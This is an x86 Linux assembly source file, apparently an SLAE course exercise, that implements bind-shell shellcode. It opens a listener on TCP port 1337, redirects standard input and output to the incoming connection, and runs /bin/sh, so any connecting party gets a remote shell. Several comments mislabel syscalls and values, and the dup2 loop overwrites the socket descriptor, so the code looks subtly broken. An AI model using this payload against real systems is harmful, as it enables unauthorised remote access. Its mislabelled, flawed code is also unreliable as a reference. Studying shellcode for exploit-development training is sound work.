; Filename: bind.nasm
; Author: Eric Van Zutphen
; SLAE ID: SLAE - 1140


global _start

_start:

        jmp long call_bind_shell

bind_shell:

        pop edx

; Socket
        push 0x6 ;tcp
        push 0x1 ;sock_stream
        push 0x2 ;af_inet on stack
        mov al, 0x66 ;socket_call into eax
        mov bl, 0x1 ;socket into bl register
        mov ecx, esp
        int 0x80

        mov esi, eax ;save sockfd

; Bind
        mov ebx, eax ; 0x3 into ebx
        xor eax, ebx ;zero out eax
        mov dword [esp-1], eax
        sub esp, 4
        mov ebx, eax ;zero out ebx
        push dword 0x3905 ;push port 1337
        push word 0x2
        mov ecx, esp ;address from esp in ecx
        push 0x10 ;push 0x1 onto the stack
        push ecx ;push address for esp on the stack
        push esi ;push sockfd on the stack
        mov al, 0x66 ;socketcall into eax 102 in decimal
        mov bl, 0x2 ;mov sys_bind in bl
        mov ecx, esp ;mov address for esp into ecx
        int 0x80

; Listen
        push 0x1 ; push 0x1
        push esi ; push 0x3
        mov al, 0x66 ; socket_call into al
        mov bl, 0x4 ; sys_listen into bl
        mov ecx, esp ; esp address into ecx
        int 0x80


; Accept
        push eax
        push esi
        mov al, 0x66 ; socket_call into al
        mov bl, 0x5 ; sys_listen in bl
        mov ecx, esp ; esp address into ecx
        int 0x80
        mov esi, eax

;Dup2
        xor ecx, ecx
        mov cl, 0x3 ; three loops

duploop:

        dec cl ;
        mov al, 0x3f ; dup2 into al
        mov ebx, esi ; mov 4 into ebx
        int 0x80
        mov esi, eax ;  mov 2 into esi
        jnz duploop


; execve

        mov eax, ecx
        xor ecx, eax
        push ecx
        mov dword [esp-4], 0x68732f6e ; ascii hs/n
        mov dword [esp-8], 0x69622f2f ; ascii ib//
        sub esp, 8
        mov ebx, esp
        push ecx
        push ebx
        mov al, 0xb ; execve syscall
        mov ecx, esp
        xor edx, edx
        int 0x80

call_bind_shell:
        call bind_shell